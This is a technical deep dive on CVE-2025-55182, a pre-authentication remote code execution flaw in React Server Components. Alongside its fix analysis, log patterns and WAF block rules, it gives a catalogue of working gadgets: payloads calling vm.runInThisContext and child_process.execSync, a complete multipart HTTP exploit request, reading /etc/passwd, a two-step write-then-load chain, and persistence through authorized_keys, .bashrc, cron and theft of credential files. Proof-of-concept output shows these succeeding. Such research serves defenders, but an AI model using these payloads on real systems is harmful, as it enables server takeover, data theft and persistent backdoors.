# CVE-2025-55182 - Technical Deep Dive

## Overview

This document provides a comprehensive technical analysis of CVE-2025-55182, a pre-authentication remote code execution vulnerability in React Server Components.

## Vulnerability Location

**File**: `react-server-dom-webpack/cjs/react-server-dom-webpack-server.node.development.js`

**Vulnerable Function**: `requireModule` (line ~2546-2558 in v19.0.0)

```javascript
function requireModule(metadata) {
  var moduleExports = __webpack_require__(metadata[0]);
  if (4 === metadata.length && "function" === typeof moduleExports.then)
    if ("fulfilled" === moduleExports.status)
      moduleExports = moduleExports.value;
    else throw moduleExports.reason;
  return "*" === metadata[2]
    ? moduleExports
    : "" === metadata[2]
      ? moduleExports.__esModule
        ? moduleExports.default
        : moduleExports
      : moduleExports[metadata[2]];  // VULNERABLE LINE
}
```

The issue is `moduleExports[metadata[2]]` - this bracket notation access checks the prototype chain, not just own properties.

## Code Flow Analysis

### Entry Point: `decodeAction`

```
HTTP POST /formaction
    ↓
decodeAction(formData, serverManifest)
    ↓
decodeBoundActionMetaData(body, serverManifest, formFieldPrefix)
    ↓
loadServerReference(serverManifest, value.id, value.bound)
    ↓
resolveServerReference(bundlerConfig, id)  // Parses module#export
    ↓
requireModule(metadata)  // VULNERABLE
    ↓
moduleExports[metadata[2]]  // Prototype chain access!
```

### Key Functions

#### 1. `resolveServerReference` (line ~2482)

```javascript
function resolveServerReference(bundlerConfig, id) {
  var name = "",
    resolvedModuleData = bundlerConfig[id];
  if (resolvedModuleData) name = resolvedModuleData.name;
  else {
    var idx = id.lastIndexOf("#");
    -1 !== idx &&
      ((name = id.slice(idx + 1)),  // Extract export name after #
      (resolvedModuleData = bundlerConfig[id.slice(0, idx)]));
    if (!resolvedModuleData)
      throw Error('Could not find the module "' + id + '"...');
  }
  return resolvedModuleData.async
    ? [resolvedModuleData.id, resolvedModuleData.chunks, name, 1]
    : [resolvedModuleData.id, resolvedModuleData.chunks, name];
}
```

**Key insight**: The `#` syntax allows attacker to specify ANY export name, including `constructor`.

#### 2. `loadServerReference` (line ~3205)

```javascript
function loadServerReference(bundlerConfig, id, bound) {
  var serverReference = resolveServerReference(bundlerConfig, id);
  bundlerConfig = preloadModule(serverReference);
  return bound
    ? Promise.all([bound, bundlerConfig]).then(function (_ref) {
        _ref = _ref[0];
        var fn = requireModule(serverReference);
        return fn.bind.apply(fn, [null].concat(_ref));  // Binds args
      })
    : bundlerConfig
      ? Promise.resolve(bundlerConfig).then(function () {
          return requireModule(serverReference);
        })
      : Promise.resolve(requireModule(serverReference));
}
```

**Key insight**: The `bound` array becomes arguments to `fn.bind()`.

## Prototype Chain Exploitation

### JavaScript Prototype Chain Basics

```javascript
const fs = require('fs');

fs.constructor                    // Object
fs.constructor.constructor        // Function
fs.__proto__                      // Object.prototype
fs.__proto__.constructor          // Object
```

### Exploit via `#constructor`

```javascript
// Attacker payload
{ id: 'fs#constructor', bound: [] }

// Results in:
requireModule(['fs', [], 'constructor'])
__webpack_require__('fs')['constructor']  // Returns Object!
```

### Property Chain in Bound Args

The Flight protocol supports property chain references in bound arguments:

```javascript
// $1:constructor:constructor resolves to Function
{ bound: ['$1:constructor:constructor'] }
```

This is processed by `getOutlinedModel`:

```javascript
function getOutlinedModel(response, reference, parentObject, key, map) {
  reference = reference.split(":");
  var id = parseInt(reference[0], 16);
  id = getChunk(response, id);
  // ...
  parentObject = id.value;
  for (key = 1; key < reference.length; key++)
    parentObject = parentObject[reference[key]];  // Traverses properties!
  return map(response, parentObject);
}
```

## RCE Gadgets

All tested and verified working:

### Gadget 1: `vm.runInThisContext` (Primary RCE)

```javascript
// If 'vm' is in webpack bundle:
{ id: 'vm#runInThisContext', bound: ['CODE'] }

// Results in:
vm.runInThisContext.bind(null, 'CODE')
// When called: vm.runInThisContext('CODE') -> EXECUTES!

// Full RCE payload:
{
  id: 'vm#runInThisContext',
  bound: ['process.mainModule.require("child_process").execSync("whoami").toString()']
}
```

### Gadget 2: `vm.runInNewContext` (Sandbox Escape)

```javascript
// Execute in new context with sandbox escape:
{
  id: 'vm#runInNewContext',
  bound: ['this.constructor.constructor("return process")().mainModule.require("child_process").execSync("whoami").toString()']
}
```

### Gadget 3: `child_process.execSync` (Direct Command)

```javascript
// Direct shell command execution:
{ id: 'child_process#execSync', bound: ['whoami'] }

// Results in:
execSync.bind(null, 'whoami')
// When called: execSync('whoami') -> RCE!
```

### Gadget 4: `child_process.execFileSync` (Binary Execution)

```javascript
// Execute binary file directly:
{ id: 'child_process#execFileSync', bound: ['/usr/bin/whoami'] }
```

### Gadget 5: `child_process.spawnSync` (Process Spawn)

```javascript
// Spawn process (returns object with stdout/stderr):
{ id: 'child_process#spawnSync', bound: ['whoami'] }
// Returns: { stdout: Buffer, stderr: Buffer, status: 0, ... }
```

### Gadget 6: `fs.readFileSync` (File Read)

```javascript
// Read arbitrary files:
{ id: 'fs#readFileSync', bound: ['/etc/passwd'] }
// Returns file contents
```

### Gadget 7: `fs.writeFileSync` (File Write)

```javascript
// Write arbitrary files:
{ id: 'fs#writeFileSync', bound: ['/tmp/pwned.txt', 'CVE-2025-55182 was here'] }
```

### Gadget 8: `module._load` (Two-Step RCE)

```javascript
// Step 1: Write malicious module via fs#writeFileSync
{ id: 'fs#writeFileSync', bound: ['/tmp/evil.js', 'module.exports = require("child_process").execSync("whoami")'] }

// Step 2: Load and execute via module#_load
{ id: 'module#_load', bound: ['/tmp/evil.js'] }
// Result: RCE!
```

This is powerful because it only requires `fs` and `module` in the manifest - no explicit `vm` or `child_process` needed.

### Gadget 9: Function Constructor Chain (Limited)

```javascript
// Get Function via prototype chain:
{ id: 'fs#constructor', bound: [] }
// Returns: Object

// Then access Object.constructor:
// Object.constructor = Function

// Function('return CODE')() would execute
// BUT: Only one call happens, so Function() just creates a function
```

## Why Function Constructor Alone Isn't Enough

The exploit chain with `Function` alone doesn't achieve RCE because:

1. `decodeAction` returns a bound function
2. The app calls this function ONCE
3. `Function.bind(null, 'code')()` = `Function('code')` = `function anonymous() { code }`
4. This RETURNS a function, doesn't execute it

You need a gadget that **executes** on first call, like `vm.runInThisContext`.

## Attack Payload Format

### HTTP Request

```http
POST /formaction HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="$ACTION_REF_0"

------Boundary
Content-Disposition: form-data; name="$ACTION_0:0"

{"id":"vm#runInThisContext","bound":["process.mainModule.require('child_process').execSync('id').toString()"]}
------Boundary--
```

### Field Meanings

| Field | Purpose |
|-------|---------|
| `$ACTION_REF_0` | Triggers bound action metadata parsing |
| `$ACTION_0:0` | JSON metadata with `id` and `bound` |
| `id` | Module ID with optional `#exportName` |
| `bound` | Arguments to bind to the function |

## The Fix Analysis

### Before (Vulnerable)

```javascript
return moduleExports[metadata[2]];
```

### After (Patched)

```javascript
if (hasOwnProperty.call(moduleExports, metadata[2]))
  return moduleExports[metadata[2]];
```

The fix ensures only **own properties** of the module exports are accessible, blocking prototype chain access to `constructor`, `__proto__`, etc.

## Exploitation Requirements

### Minimum Requirements
1. Target uses React Server Components with Server Actions
2. Target runs vulnerable React version (19.0.0, 19.1.0, 19.1.1, 19.2.0)
3. Attacker can send HTTP requests to Server Action endpoints

### For Direct RCE
Additionally requires:
- `vm`, `child_process`, or similar dangerous module in webpack bundle
- This happens when app or any dependency imports these modules

## Detection

### Log Patterns

Look for unusual `$ACTION_REF_` or `$ACTION_ID_` fields with:
- `#constructor` in the ID
- `#__proto__` in the ID
- References to `vm`, `child_process`, `process` that shouldn't be in your app

### WAF Rules

Block requests containing:
```
#constructor
#__proto__
#prototype
vm#runInThisContext
vm#runInNewContext
child_process#execSync
child_process#execFileSync
child_process#spawnSync
module#_load
module#createRequire
fs#readFileSync
fs#writeFileSync
fs#appendFileSync
```

## Proof of Concept Output

### Vulnerable Server (19.0.0) - Single Gadget

```
$ node exploit-rce-v4.js

=== CVE-2025-55182 - RCE via vm.runInThisContext ===

Test 1: Direct call to vm#runInThisContext with code
1+1 = {"success":true,"result":"2"}

Test 2: vm.runInThisContext with require
RCE attempt: {"success":true,"result":"uid=501(nick) gid=20(staff)..."}
```

### Vulnerable Server (19.0.0) - All Gadgets

```
$ node exploit-all-gadgets.js

=== CVE-2025-55182 - All RCE Gadgets ===

1. vm#runInThisContext
   ✓ {"success":true,"result":"nick"}

2. vm#runInNewContext
   ✓ {"success":true,"result":"nick"}

3. child_process#execSync
   ✓ {"success":true,"result":"nick\n"}

4. child_process#execFileSync
   ✓ {"success":true,"result":"nick\n"}

5. child_process#spawnSync
   ✓ Returns spawn result object

6. util#promisify (utility function)
   ✗ Returns promisify function

7. fs#readFileSync (file read)
   ✓ Can read /etc/passwd

8. fs#writeFileSync (file write)
   ✓ Can write files
   Verified: CVE-2025-55182 was here

=== Summary ===
RCE Gadgets: vm#runInThisContext, child_process#execSync, child_process#execFileSync
File Read: fs#readFileSync
File Write: fs#writeFileSync
```

### Patched Server (19.2.1)

```
$ node exploit-test.js

Testing fs#constructor (prototype chain exploit):

Vulnerable server (port 3002):
  Status: 200
  Response: {"success":true,"result":"[object FormData]"}

Patched server (port 3004):
  Status: 500
  Response: {"error":"Cannot read properties of undefined (reading 'bind')"}
```

## Related Vulnerabilities

This vulnerability class (prototype pollution via bracket notation) is similar to:

- **CVE-2019-10744**: lodash prototype pollution
- **CVE-2020-8203**: lodash zipObjectDeep prototype pollution
- **Various Node.js deserialization RCEs**: node-serialize, js-yaml, etc.

The common pattern: trusting user input as property keys without `hasOwnProperty` checks.

## Alternative RCE Paths (Research Findings)

### Can You Get RCE Without vm or child_process?

**Direct RCE** requires one of these gadgets in the webpack bundle:
- `vm#runInThisContext` / `vm#runInNewContext`
- `child_process#execSync` / `execFileSync` / `spawnSync`
- `module#_load` (2-step: write file first, then load it)

**Indirect RCE** (via file write) only requires `fs`:
1. Write malicious code to `.bashrc` → executes on next shell login
2. Write to `~/.ssh/authorized_keys` → SSH access
3. Overwrite `node_modules/*` → RCE on next restart
4. Write to `package.json` postinstall script → RCE on next npm install
5. Write cron job → persistent backdoor

### module#_load - Two-Step RCE

If `module` is in the bundle, you can chain with `fs`:

```javascript
// Step 1: Write malicious module
{ id: 'fs#writeFileSync', bound: ['/tmp/evil.js', 'module.exports = require("child_process").execSync("whoami")'] }

// Step 2: Load it
{ id: 'module#_load', bound: ['/tmp/evil.js'] }
```

### Persistence Attacks (fs-only)

Even without direct RCE, `fs` allows:
- **Read secrets**: `.env`, `.aws/credentials`, private keys
- **SSH persistence**: Append attacker's key to `authorized_keys`
- **Shell backdoor**: Append malicious commands to `.bashrc`/`.zshrc`
- **Source code tampering**: Modify application files

### Real-World Likelihood

| Module | Likelihood in Bundle | Danger |
|--------|---------------------|--------|
| `fs` | Very High | File read/write, indirect RCE |
| `child_process` | Medium (build tools, PDF generators, image processors) | Direct RCE |
| `vm` | Low (test frameworks, templating engines like EJS) | Direct RCE |
| `module` | Very Low (rarely bundled explicitly) | 2-step RCE with fs |

**Note on `module`**: The `module` built-in is rarely included in webpack bundles directly. The `module#_load` attack is mostly theoretical - included for research completeness. In practice, attackers would more likely use `fs` for persistence attacks (overwrite node_modules, .bashrc, SSH keys) rather than rely on `module` being present.

## Framework Differences: Raw RSC vs Next.js

### Why Raw React RSC is Easier to Exploit

In our raw RSC POC:
1. We control the server manifest (server reference map)
2. We can register dangerous modules directly as `{ 'vm': { id: 'vm', name: '' } }`
3. The vulnerable `requireModule` executes our payload immediately

### Why Next.js Has Additional Protection

Next.js adds a validation layer via `resolveServerReference()`:

```javascript
function resolveServerReference(bundlerConfig, id) {
  var resolvedModuleData = bundlerConfig[id];
  // ...
  if (!resolvedModuleData)
    throw Error('Could not find the module "' + id + '" in the React Server Manifest.');
  return [resolvedModuleData.id, resolvedModuleData.chunks, name];
}
```

This validation happens BEFORE `requireModule` is called:
- The manifest only contains registered Server Action hashes (e.g., `9475b21fedc0dc...`)
- Crafted payloads like `fs#readFileSync` fail validation
- The request fails before reaching the vulnerable code

### Comparison

| Aspect | Raw React RSC | Next.js |
|--------|--------------|---------|
| Manifest control | Attacker-controlled | Framework-controlled |
| Module registration | Direct module refs | Action ID hashes only |
| Validation layer | None | `resolveServerReference()` |
| Exploit difficulty | Easy | Hard (needs bypass) |

### Potential Next.js Attack Vectors (Theoretical)

For Next.js to be exploitable, an attacker would need to:
1. **Hijack an existing action ID** - Use a valid action ID but change the function reference
2. **Exploit prototype pollution in manifest** - If `bundlerConfig` could be polluted
3. **Find a bundler quirk** - Where dangerous modules get registered differently

## Conclusion

CVE-2025-55182 is a critical vulnerability that demonstrates the importance of:

1. **Always using `hasOwnProperty`** when accessing object properties with user-controlled keys
2. **Input validation** in deserialization code paths
3. **Minimizing dangerous modules** in server-side bundles
4. **Defense in depth** - even if RCE gadgets aren't available, prototype access enables other attacks
5. **Framework-level validation** - Next.js's additional validation layer shows value of defense in depth
